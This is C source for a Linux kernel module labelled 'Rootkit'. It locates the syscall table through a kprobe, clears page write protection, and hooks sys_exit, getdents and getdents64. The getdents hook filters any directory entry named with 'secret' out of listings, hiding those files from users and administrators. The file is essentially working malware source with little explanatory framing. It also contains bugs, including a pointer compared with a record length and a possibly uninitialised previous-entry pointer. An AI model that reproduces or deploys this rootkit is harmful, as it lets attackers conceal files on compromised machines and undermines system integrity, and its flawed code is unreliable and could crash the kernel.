#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/vmalloc.h>
#include <asm/unistd.h> // contains syscall numbers
#include <linux/kprobes.h>
#include <asm/pgtable_types.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/file.h>

MODULE_AUTHOR("Parth Thakkar");
MODULE_DESCRIPTION("Rootkit");
MODULE_LICENSE("GPL");

#define HIDE_FILE "secret"

// Structure definitions for directory entries
// These structures are used to manipulate directory listing data

// struct linux_dirent {
//                unsigned long  d_ino;     /* Inode number */
//                unsigned long  d_off;     /* Not an offset; see below */
//                unsigned short d_reclen;  /* Length of this linux_dirent */
//                char           d_name[];  /* Filename (null-terminated) */
//                                  /* length is actually (d_reclen - 2 -
//                                     offsetof(struct linux_dirent, d_name)) */
//                /*
//                char           pad;       // Zero padding byte
//                char           d_type;    // File type (only since Linux
//                                          // 2.6.4); offset is (d_reclen - 1)
//                */
//            }

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};

struct linux_dirent64 {
	u64		d_ino;
	s64		d_off;
	unsigned short	d_reclen;
	unsigned char	d_type;
	char		d_name[];
};

// Kprobe structure for finding kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

// Function pointers to store original system call implementations
asmlinkage long (*original_getdents64)(int fd, struct linux_dirent64 * dirp, unsigned int count);
asmlinkage long (*original_getdents)(int fd, struct linux_dirent * dirp, unsigned int count);
asmlinkage int (*original_sys_exit)(int);

uint8_t was_writable = 0;
void **sys_call_table_addr = (void *)0xffffffff88400280;

/**
 * make_rw - Make a memory page writable
 * @address: The address of the memory to make writable
 *
 * This function modifies the page table entry to make a given memory address writable.
 * It's used to allow modifications to normally read-only kernel memory.
 *
 * Return: 1 if the page was made writable, 0 if it was already writable
 */
static int make_rw(unsigned long address){

    // &level: A pointer to an integer. After the function call, this integer will contain:

    // 0 for PTE (4KB page)
    // 1 for PMD (2MB page)
    // 2 for PUD (1GB page)
    // 3 for P4D (512GB page, if supported)
    // 4 for PGD (top-level directory)
    unsigned int level;
    pte_t * page_table_entry = lookup_address(address, &level);

    // CR0
    // Bit	Label	Description
    // 0	PE	Protected Mode Enable
    // 1	MP	Monitor co-processor
    // 2	EM	x87 FPU Emulation
    // 3	TS	Task switched
    // 4	ET	Extension type
    // 5	NE	Numeric error
    // 16	WP	Write protect
    // 18	AM	Alignment mask
    // 29	NW	Not-write through
    // 30	CD	Cache disable
    // 31	PG	Paging


    // #define _PAGE_BIT_RW		1	/* writeable */ wreitable bit

    // #define _PAGE_PRESENT	(_AT(pteval_t, 1) << _PAGE_BIT_PRESENT)
    // #define _PAGE_RW	(_AT(pteval_t, 1) << _PAGE_BIT_RW)
    // #define _PAGE_USER	(_AT(pteval_t, 1) << _PAGE_BIT_USER)
    // #define _PAGE_PWT	(_AT(pteval_t, 1) << _PAGE_BIT_PWT)
    // #define _PAGE_PCD	(_AT(pteval_t, 1) << _PAGE_BIT_PCD)
    // #define _PAGE_ACCESSED	(_AT(pteval_t, 1) << _PAGE_BIT_ACCESSED)
    // #define _PAGE_DIRTY	(_AT(pteval_t, 1) << _PAGE_BIT_DIRTY)
    // #define _PAGE_PSE	(_AT(pteval_t, 1) << _PAGE_BIT_PSE)
    // #define _PAGE_GLOBAL	(_AT(pteval_t, 1) << _PAGE_BIT_GLOBAL)
    // #define _PAGE_SOFTW1	(_AT(pteval_t, 1) << _PAGE_BIT_SOFTW1)
    // #define _PAGE_SOFTW2	(_AT(pteval_t, 1) << _PAGE_BIT_SOFTW2)
    // #define _PAGE_SOFTW3	(_AT(pteval_t, 1) << _PAGE_BIT_SOFTW3)
    // #define _PAGE_PAT	(_AT(pteval_t, 1) << _PAGE_BIT_PAT)
    // #define _PAGE_PAT_LARGE (_AT(pteval_t, 1) << _PAGE_BIT_PAT_LARGE)
    // #define _PAGE_SPECIAL	(_AT(pteval_t, 1) << _PAGE_BIT_SPECIAL)
    // #define _PAGE_CPA_TEST	(_AT(pteval_t, 1) << _PAGE_BIT_CPA_TEST)
    was_writable = 1;
    // we can not write directly to pte value in pte_t structure so we are adding that bit manually 
    // Access control: Applies to both user-mode and kernel-mode accesses to this page.
    if(!pte_write(*page_table_entry)){
        // not writable 
        printk(KERN_INFO "Syscall was not writable, now made it writable, \n");
        page_table_entry->pte |= _PAGE_RW;
        was_writable = 0;
        return 1;
    }
    return 0;

}

/**
 * make_ro - Make a memory page read-only
 * @address: The address of the memory to make read-only
 *
 * This function modifies the page table entry to make a given memory address read-only.
 * It's used to restore the normal protection of kernel memory after modifications.
 */
static void make_ro(unsigned long address){

    unsigned int level;
    pte_t * page_table_entry = lookup_address(address, &level);
    if(was_writable == 0){
        printk(KERN_INFO "Syscall was writable, now made it readable, end .... \n");
        page_table_entry->pte &= ~_PAGE_RW;
    }

}

/**
 * custom_sys_exit - Custom implementation of sys_exit
 * @error_no: The exit status
 *
 * This function intercepts the sys_exit system call, logs the exit code,
 * and then calls the original sys_exit function.
 *
 * Return: The return value of the original sys_exit call
 */
asmlinkage int custom_sys_exit(int error_no){
    printk("HEY! sys_exit called with error_code=%d\n", error_no);
    /*call the original sys_exit*/
    return original_sys_exit(error_no);
}

/**
 * fake_getdents64 - Custom implementation of getdents64
 * @fd: File descriptor of the directory
 * @dirp: Pointer to the linux_dirent64 structure
 * @count: Number of bytes to read
 *
 * This function intercepts the getdents64 system call. Currently, it just logs
 * the call and passes it through to the original function.
 *
 * Return: The number of bytes read or an appropriate error code
 */
asmlinkage long fake_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
    printk("Fake getdents64 called \n");
    
    return original_getdents64(fd, dirp, count);
}

/**
 * fake_getdents - Custom implementation of getdents
 * @fd: File descriptor of the directory
 * @original_dir_entry: Pointer to the linux_dirent structure
 * @count: Number of bytes to read
 *
 * This function intercepts the getdents system call and filters out entries
 * containing the HIDE_FILE string. It's used to hide specific files or directories.
 *
 * Return: The number of bytes read or an appropriate error code
 */
asmlinkage long fake_getdents(int fd, struct linux_dirent * original_dir_entry, unsigned int count) {
    printk("Fake getdents called \n");
    struct linux_dirent *rootkit_dir_entry_structure;
    // the output of getdents is the number of bytes read
    long nbytes = (typeof(sys_getdents)*)(original_getdents)(fd, original_dir_entry, count);
    

//     kmalloc can be used in interrupt context with appropriate flags.
// vmalloc cannot be used in interrupt context as it may sleep.
// kvmalloc behavior depends on the flags and the actual allocation method used

// Memory allocated by vmalloc and sometimes kvmalloc is visible in /proc/vmallocinfo, which can be useful for debugging.
// kmalloc allocations are typically not directly visible in proc files but can be tracked using kernel memory debugging tools.

// Provides a flexible allocation strategy combining kmalloc and vmalloc.
    rootkit_dir_entry_structure = kvmalloc(nbytes, GFP_KERNEL);
	if (rootkit_dir_entry_structure == NULL) {
		pr_info("fake dents allocation error");
        // used when memory is allocated with kvmalloc;
		kvfree( rootkit_dir_entry_structure );
		return -1;
	}
    copy_from_user(rootkit_dir_entry_structure, original_dir_entry, nbytes);


    long offset = 0;
    struct linux_dirent *current_rootkit_dir_entry, *prev_dir_entry;
    unsigned short current_dir_record_lenth;
    while(offset < nbytes){
        // converting to void * is important as we need just byte addressable array
        current_rootkit_dir_entry = (void *)rootkit_dir_entry_structure + offset;
        current_dir_record_lenth = current_rootkit_dir_entry->d_reclen;

        // check if name is matching
        if(strstr(current_rootkit_dir_entry->d_name, HIDE_FILE) != NULL){
            if(current_dir_record_lenth == rootkit_dir_entry_structure){
                // match at first entry; then there is not previous entry to "absrob" it.
                nbytes -= current_dir_record_lenth;
                // so we move the memory by the lenght of current entry.
                memmove(rootkit_dir_entry_structure, (void *)rootkit_dir_entry_structure, nbytes);
            }
            printk(KERN_INFO "hiding %s", current_rootkit_dir_entry->d_name);
            // basically we are moving two times when reading previous entry
            // , one own record lenght and other current record length
            prev_dir_entry->d_reclen += current_dir_record_lenth;
        }
        else{
            // if no match then  previous would be current
            prev_dir_entry = current_rootkit_dir_entry;
        }
        offset += current_dir_record_lenth;
    }
    copy_to_user(original_dir_entry, rootkit_dir_entry_structure, nbytes);
    kvfree(rootkit_dir_entry_structure);
    return nbytes;
}

/**
 * custom_init - Initialization function for the rootkit
 *
 * This function is called when the module is loaded. It resolves the address
 * of the system call table and hooks the target system calls.
 *
 * Return: 0 on success, negative error code on failure
 */
static int __init custom_init(void)
{
    int ret = 0;
    printk(KERN_INFO "Init\n");

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_my;
    register_kprobe(&kp);
    kallsyms_lookup_name_my = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    sys_call_table_addr = (void *)kallsyms_lookup_name_my("sys_call_table");
    if (sys_call_table_addr == NULL)
    {
        pr_info("sys_call_table not found using kprobe my kallsyms\n");
        return -1;
    }
    printk(KERN_INFO "sys_call_table pointer from kprobe is %p\n", sys_call_table_addr);

    //get and store sys_call_table ptr
    sys_call_table_addr = (void *)kallsyms_lookup_name("sys_call_table");
    if (sys_call_table_addr == NULL)
    {
        pr_info("sys_call_table not found using kallsyms\n");
        return -1;
    }

    printk(KERN_INFO "sys_call_table pointer from normal lookup is %p\n", sys_call_table_addr);

    make_rw((unsigned long)sys_call_table_addr);
    original_sys_exit = sys_call_table_addr[__NR_exit];
    sys_call_table_addr[__NR_exit] = (void *)custom_sys_exit;

    original_getdents = sys_call_table_addr[__NR_getdents];
    sys_call_table_addr[__NR_getdents] = (void *)fake_getdents;

    original_getdents64 = sys_call_table_addr[__NR_getdents64];
    sys_call_table_addr[__NR_getdents64] = (void *)fake_getdents64;

    make_ro((unsigned long)sys_call_table_addr);

    return ret;
}

/**
 * custom_exit - Cleanup function for the rootkit
 *
 * This function is called when the module is unloaded. It restores the original
 * system calls and cleans up any resources used by the rootkit.
 */
static void __exit custom_exit(void){
    // sys_call_table[__NR_exit] = original_sys_exit;

    make_rw((unsigned long)sys_call_table_addr);
    sys_call_table_addr[__NR_exit] = original_sys_exit;
    sys_call_table_addr[__NR_getdents] = original_getdents;
    sys_call_table_addr[__NR_getdents64] = original_getdents64;
    make_ro((unsigned long)sys_call_table_addr);

    printk(KERN_INFO "Noooooo..... my interception ,,,,,  exiting....\n");
}


module_init(custom_init);
module_exit(custom_exit);